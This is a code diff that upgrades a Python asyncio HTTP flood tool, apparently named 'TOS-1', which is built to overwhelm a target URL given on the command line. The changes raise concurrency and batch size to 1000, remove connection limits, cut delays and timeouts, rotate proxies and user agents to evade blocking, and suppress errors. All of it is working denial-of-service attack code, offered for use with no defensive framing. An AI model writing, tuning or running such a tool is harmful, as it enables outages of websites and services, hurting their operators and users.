@@ -24,12 +24,16 @@ class TOS1:
         self.current_proxy = ""
         self.current_ua = ""
         
-        # Concurrency control (no CPU monitoring)
-        self.concurrency = 500
+        # MAX CONCURRENCY
+        self.concurrency = 1000  # RAMPED UP
         self.semaphore = asyncio.Semaphore(self.concurrency)
         
         # Session
         self.session = None
+        self.connector = None
+        
+        # Last maintenance
+        self.last_maintenance = time.time()
         
     def load_file(self, filename):
         """Load lines from file"""
@@ -48,19 +52,14 @@ class TOS1:
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Connection': 'keep-alive',
                 'Upgrade-Insecure-Requests': '1',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Cache-Control': 'max-age=0'
+                'Cache-Control': 'no-cache'
             },
             {
-                'Accept': 'application/json, text/plain, */*',
+                'Accept': '*/*',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'keep-alive',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin'
+                'Cache-Control': 'no-cache'
             }
         ]
     
@@ -77,36 +76,42 @@ class TOS1:
             self.current_headers['User-Agent'] = self.current_ua
     
     async def create_session(self):
-        """Create aiohttp session"""
-        connector = aiohttp.TCPConnector(limit=0, force_close=True)
-        timeout = aiohttp.ClientTimeout(total=5)
-        self.session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=timeout
+        """Create optimized aiohttp session"""
+        self.connector = aiohttp.TCPConnector(
+            limit=0,  # Unlimited connections
+            limit_per_host=0,
+            ttl_dns_cache=0,
+            force_close=True,
+            enable_cleanup_closed=True
         )
+        
+        self.session = aiohttp.ClientSession(
+            connector=self.connector,
+            timeout=aiohttp.ClientTimeout(total=3)  # Short timeout
+        )
+        self.rotate_resources()
     
     async def send_request(self):
-        """Send single request"""
+        """Send single request - MAX SPEED"""
         if not self.session or not self.attack_active:
             return
         
-        async with self.semaphore:
-            try:
-                proxy_url = f"http://{self.current_proxy}" if self.current_proxy else None
-                
-                async with self.session.get(
-                    self.target_url,
-                    headers=self.current_headers,
-                    proxy=proxy_url,
-                    ssl=False
-                ) as response:
-                    await response.read()
-                    
-            except:
-                pass  # Silent fail
+        try:
+            proxy_url = f"http://{self.current_proxy}" if self.current_proxy else None
             
-            finally:
-                self.total_requests += 1
+            async with self.session.get(
+                self.target_url,
+                headers=self.current_headers,
+                proxy=proxy_url,
+                ssl=False
+            ) as response:
+                await response.read()  # Read but don't process
+                
+        except:
+            pass  # SILENT FAIL - MAX SPEED
+        
+        finally:
+            self.total_requests += 1
     
     def update_display(self):
         """Update display - ONLY THIS LOGGING"""
@@ -125,15 +130,16 @@ class TOS1:
                 if self.session:
                     await self.session.close()
                     self.session = None
+                    self.connector = None
                 
-                # Clear and rotate resources
+                # Rotate resources
                 self.rotate_resources()
                 
                 # Create new session
                 await self.create_session()
                 
-                # Wait a moment
-                await asyncio.sleep(2)
+                # Short wait
+                await asyncio.sleep(1)
                 
                 self.attack_active = True
                 self.last_maintenance = current_time
@@ -141,29 +147,28 @@ class TOS1:
             await asyncio.sleep(1)
     
     async def attack_loop(self):
-        """Main attack loop"""
+        """MAX SPEED ATTACK LOOP"""
         await self.create_session()
-        self.rotate_resources()
-        self.last_maintenance = time.time()
         
-        # High RPS loop
+        # MAX SPEED LOOP
         while self.running and self.attack_active:
-            # Send batch of requests
+            # CREATE BATCH OF 1000 TASKS
             tasks = []
-            for _ in range(min(self.concurrency, 50)):
+            for _ in range(1000):  # MAX BATCH SIZE
                 tasks.append(self.send_request())
             
+            # FIRE ALL AT ONCE
             if tasks:
                 await asyncio.gather(*tasks, return_exceptions=True)
             
+            # UPDATE DISPLAY
             self.update_display()
             
-            # Small delay
-            await asyncio.sleep(0.0001)
+            # MINIMAL DELAY
+            await asyncio.sleep(0.00001)
     
     async def run(self):
         """Main run method"""
-        # Initial display
         print("𝖳Ø𝖲-1 | 𝖲023")
         await asyncio.sleep(2)
         os.system('clear')
@@ -171,7 +176,7 @@ class TOS1:
         # Start maintenance in background
         maintenance_task = asyncio.create_task(self.maintenance())
         
-        # Start attack
+        # MAX SPEED ATTACK
         try:
             await self.attack_loop()
         except KeyboardInterrupt:
@@ -180,30 +185,36 @@ class TOS1:
             maintenance_task.cancel()
             if self.session:
                 await self.session.close()
-            
-            # NO FINAL STATS - just exit
             sys.exit(0)
 
-# Main execution
+# MAIN WITH UVLOOP FOR MAX SPEED
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         sys.exit(1)
     
     target = sys.argv[1]
     
-    # Check for required files
+    # Check files
     if not os.path.exists("main.txt"):
-        # Create empty if doesn't exist (will run without proxies)
-        with open("main.txt", "w") as f:
-            pass
+        open("main.txt", "w").close()
     
     if not os.path.exists("ua.txt"):
-        # Create default UAs
         with open("ua.txt", "w") as f:
             f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n")
             f.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n")
+            f.write("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\n")
     
-    tos = TOS1(target)
+    # Try to use uvloop for MAX SPEED
+    try:
+        import uvloop
+        uvloop.install()
+    except:
+        pass
+    
+    # Increase limits
+    import asyncio
+    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())
     
     # Run
+    tos = TOS1(target)
     asyncio.run(tos.run())
